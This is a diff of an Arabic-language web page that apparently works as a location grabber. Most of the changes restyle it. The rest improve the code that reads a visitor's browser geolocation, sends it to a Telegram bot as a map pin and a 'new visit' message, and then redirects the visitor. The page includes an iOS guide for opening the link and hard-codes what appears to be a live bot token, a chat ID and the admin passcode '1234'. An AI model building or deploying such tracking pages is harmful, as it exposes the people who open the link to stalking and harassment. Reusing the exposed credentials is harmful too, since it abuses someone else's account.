@@ -3,8 +3,8 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<meta name="theme-color" content="#0B1620">
-<meta name="color-scheme" content="dark">
+<meta name="theme-color" content="#F2F5D8">
+<meta name="color-scheme" content="light">
 <title>تحديد الموقع</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -18,18 +18,19 @@
      موجودة في كود الـ JS تحت (داخل CONFIG) */
 
   :root{
-    --bg: #0B1620;
-    --bg-glow: radial-gradient(circle at 50% 20%, rgba(232,179,76,0.10), transparent 60%);
-    --surface: #121D28;
-    --surface-2: #17232F;
-    --border: rgba(255,255,255,0.08);
-    --text: #EAF2F2;
-    --text-dim: #93A9B0;
-    --accent: #E8B34C;
-    --accent-strong: #F4C568;
-    --success: #4ADE80;
-    --danger: #F58C8C;
-    --radius: 18px;
+    --bg: #F2F5D8;
+    --bg-glow: radial-gradient(circle at 50% 0%, rgba(197,244,57,0.35), transparent 55%);
+    --surface: #FFFFFF;
+    --surface-2: #F5F8E2;
+    --border: rgba(0,0,0,0.08);
+    --text: #111111;
+    --text-dim: #5A6350;
+    --accent: #C5F439;
+    --accent-strong: #ADDC1E;
+    --accent-text: #111111;
+    --success: #22C55E;
+    --danger: #EF4444;
+    --radius: 20px;
   }
 
   *{ box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
@@ -63,6 +64,7 @@
     border-radius: var(--radius);
     padding: 40px 28px 32px;
     text-align: center;
+    box-shadow: 0 4px 32px rgba(0,0,0,0.08);
   }
 
   .pin-wrap{
@@ -79,7 +81,7 @@
     position: absolute;
     inset: 0;
     border-radius: 50%;
-    border: 1.5px solid var(--accent);
+    border: 1.5px solid var(--accent-strong);
     opacity: 0;
   }
 
@@ -121,34 +123,35 @@
 
   button.primary{
     width: 100%;
-    min-height: 50px;
+    min-height: 52px;
     border: none;
-    border-radius: 12px;
-    padding: 15px 20px;
+    border-radius: 100px;
+    padding: 15px 24px;
     background: var(--accent);
-    color: #14202B;
+    color: var(--accent-text);
     font-family: inherit;
     font-size: 1rem;
-    font-weight: 700;
+    font-weight: 800;
     cursor: pointer;
     transition: background .15s ease, transform .1s ease;
+    letter-spacing: -0.01em;
   }
   button.primary:hover{ background: var(--accent-strong); }
   button.primary:active{ transform: scale(.98); }
-  button.primary:disabled{ opacity: .55; cursor: default; }
+  button.primary:disabled{ opacity: .45; cursor: default; }
   button.primary:focus-visible{ outline: 2px solid var(--accent-strong); outline-offset: 3px; }
 
   button.ghost{
     width: 100%;
     min-height: 48px;
-    border: 1px solid var(--border);
-    border-radius: 12px;
+    border: 1.5px solid var(--border);
+    border-radius: 100px;
     padding: 13px 20px;
     background: transparent;
     color: var(--text);
     font-family: inherit;
     font-size: .92rem;
-    font-weight: 600;
+    font-weight: 700;
     cursor: pointer;
     margin-top: 10px;
   }
@@ -181,6 +184,7 @@
     border: 1px solid var(--border);
     border-radius: var(--radius);
     padding: 28px;
+    box-shadow: 0 4px 32px rgba(0,0,0,0.08);
   }
 
   .admin h1{ text-align: right; font-size: 1.25rem; }
@@ -202,16 +206,17 @@
   .admin-actions{ display: flex; gap: 8px; }
 
   .btn-sm{
-    border: 1px solid var(--border);
+    border: 1.5px solid var(--border);
     background: var(--surface-2);
     color: var(--text);
-    border-radius: 10px;
-    padding: 8px 14px;
+    border-radius: 100px;
+    padding: 8px 16px;
     font-family: inherit;
     font-size: .84rem;
+    font-weight: 700;
     cursor: pointer;
   }
-  .btn-sm:hover{ border-color: var(--accent); }
+  .btn-sm:hover{ border-color: var(--accent-strong); background: var(--accent); }
 
   table{
     width: 100%;
@@ -246,16 +251,20 @@
   .passcode-box input{
     width: 100%;
     padding: 14px;
-    border-radius: 10px;
-    border: 1px solid var(--border);
+    border-radius: 14px;
+    border: 1.5px solid var(--border);
     background: var(--surface-2);
     color: var(--text);
     font-family: inherit;
-    font-size: 16px; /* يمنع تكبير الشاشة تلقائي في آيفون عند التركيز على الحقل */
+    font-size: 16px;
     appearance: none;
     -webkit-appearance: none;
     text-align: center;
     margin-bottom: 12px;
+  }
+  .passcode-box input:focus{
+    outline: none;
+    border-color: var(--accent-strong);
   }
 
   /* ===================== دليل فتح الرابط (iOS) ===================== */
@@ -278,7 +287,7 @@
     height: 28px;
     border-radius: 50%;
     background: var(--accent);
-    color: #14202B;
+    color: #111111;
     font-weight: 800;
     font-size: .82rem;
     display: flex;
@@ -287,7 +296,7 @@
     flex-shrink: 0;
     margin-top: 1px;
   }
-  .ios-guide strong{ color: var(--accent-strong); }
+  .ios-guide strong{ color: #5A7A00; font-weight: 800; }
 
   /* ===================== موبايلات صغيرة ===================== */
   @media (max-width: 380px){
@@ -337,8 +346,8 @@
       <div class="pin-ring"></div>
       <div class="pin-ring"></div>
       <svg class="pin-icon" id="pinIcon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-        <path d="M12 21s7-7.1 7-12a7 7 0 1 0-14 0c0 4.9 7 12 7 12Z" stroke="#E8B34C" stroke-width="1.6"/>
-        <circle cx="12" cy="9" r="2.4" stroke="#E8B34C" stroke-width="1.6"/>
+        <path d="M12 21s7-7.1 7-12a7 7 0 1 0-14 0c0 4.9 7 12 7 12Z" stroke="#ADDC1E" stroke-width="1.8" fill="#C5F439"/>
+        <circle cx="12" cy="9" r="2.4" stroke="#111111" stroke-width="1.6" fill="#111111"/>
       </svg>
     </div>
 
@@ -413,9 +422,9 @@ const CONFIG = {
   adminPasscode: "1234",
 
   // --- إعدادات بوت تيليجرام ---
-  // توكن البوت من BotFather. سيبه فاضي "" لو مش عايز إرسال تيليجرام
+  // توكن البوت من BotFather — صيغته: 123456789:AAExxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
   telegramBotToken: "8957494852:AAHEYi-iGdCgDSbgE3-ISJTZ_x5KEgZcbx0",
-  // الـ chat_id بتاعك أو بتاع الجروب/القناة اللي هيوصلها الإشعار
+  // الـ chat_id بتاعك — رقم بدون أي حروف
   telegramChatId: "8806116489",
 };
 
@@ -589,35 +598,37 @@ async function saveVisit(latitude, longitude, accuracy, timeIso){
 }
 
 async function sendToTelegram(latitude, longitude, accuracy, timeStr){
-  const base = `https://api.telegram.org/bot${CONFIG.telegramBotToken}`;
+  const token   = CONFIG.telegramBotToken.trim();
+  const chatId  = CONFIG.telegramChatId.toString().trim();
+  const base    = `https://api.telegram.org/bot${token}`;
   const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
-  try {
-    // بيبعت الموقع كدبوس حقيقي على الخريطة جوه تيليجرام
-    await fetch(`${base}/sendLocation`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: CONFIG.telegramChatId,
-        latitude,
-        longitude,
-        horizontal_accuracy: accuracy ? Math.min(accuracy, 1500) : undefined,
-      }),
-    });
+  // إرسال الموقع كدبوس على الخريطة
+  const locRes  = await fetch(`${base}/sendLocation`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: chatId,
+      latitude,
+      longitude,
+      horizontal_accuracy: accuracy ? Math.min(accuracy, 1500) : undefined,
+    }),
+  });
+  const locData = await locRes.json();
+  if (!locData.ok) throw new Error(`sendLocation: ${locData.description} (${locData.error_code})`);
 
-    // رسالة نصية بتفاصيل إضافية (الوقت والدقة ورابط خرائط جوجل)
-    const accText = accuracy ? `± ${Math.round(accuracy)} م` : "غير متاحة";
-    await fetch(`${base}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: CONFIG.telegramChatId,
-        text: `📍 زيارة جديدة\nالوقت: ${timeStr}\nدقة الموقع: ${accText}\nالخريطة: ${mapsUrl}`,
-      }),
-    });
-  } catch (e) {
-    console.error("تعذر الإرسال إلى تيليجرام:", e);
-  }
+  // رسالة نصية بالتفاصيل
+  const accText = accuracy ? `± ${Math.round(accuracy)} م` : "غير متاحة";
+  const msgRes  = await fetch(`${base}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: `📍 زيارة جديدة\nالوقت: ${timeStr}\nدقة الموقع: ${accText}\nالخريطة: ${mapsUrl}`,
+    }),
+  });
+  const msgData = await msgRes.json();
+  if (!msgData.ok) throw new Error(`sendMessage: ${msgData.description} (${msgData.error_code})`);
 }
 
 async function onLocationSuccess(position){
@@ -625,23 +636,43 @@ async function onLocationSuccess(position){
   const timeIso = new Date().toISOString();
   const timeStr = new Date().toLocaleString("ar-EG", { dateStyle: "medium", timeStyle: "short" });
 
+  const token    = CONFIG.telegramBotToken.trim();
+  const chatId   = CONFIG.telegramChatId.toString().trim();
+  const hasTg    = !!(token && chatId);
+
   setState({
-    title: "تم تحديد موقعك",
-    message: "بنجهزلك التحويل...",
-    showMain: false,
-    locating: true,
+    title: hasTg ? "جاري إرسال موقعك..." : "تم تحديد موقعك",
+    message: hasTg ? "بنبعت الموقع على تيليجرام..." : "جاري تحويلك...",
+    showMain: false, locating: true,
   });
 
   const tasks = [];
   if (hasStorage) tasks.push(saveVisit(latitude, longitude, accuracy, timeIso));
-  if (CONFIG.telegramBotToken && CONFIG.telegramChatId) {
-    tasks.push(sendToTelegram(latitude, longitude, accuracy, timeStr));
+
+  if (hasTg) {
+    tasks.push(
+      sendToTelegram(latitude, longitude, accuracy, timeStr)
+        .then(() => {
+          setState({
+            title: "✓ تم الإرسال",
+            message: "جاري تحويلك...",
+            showMain: false, locating: true,
+          });
+        })
+        .catch(err => {
+          console.error("[Telegram]", err.message);
+          setState({
+            title: "تم تحديد موقعك",
+            message: `تعذر إرسال تيليجرام: ${err.message}`,
+            showMain: false, locating: false,
+          });
+        })
+    );
   }
 
-  // ننتظر الإرسال يخلص، لكن من غير ما نعلّق التحويل أكتر من الحد الأقصى المحدد
   await Promise.race([
     Promise.allSettled(tasks),
-    new Promise((resolve) => setTimeout(resolve, CONFIG.maxWaitBeforeRedirectMs)),
+    new Promise(resolve => setTimeout(resolve, CONFIG.maxWaitBeforeRedirectMs)),
   ]);
 
   redirectWithLocation(latitude, longitude);
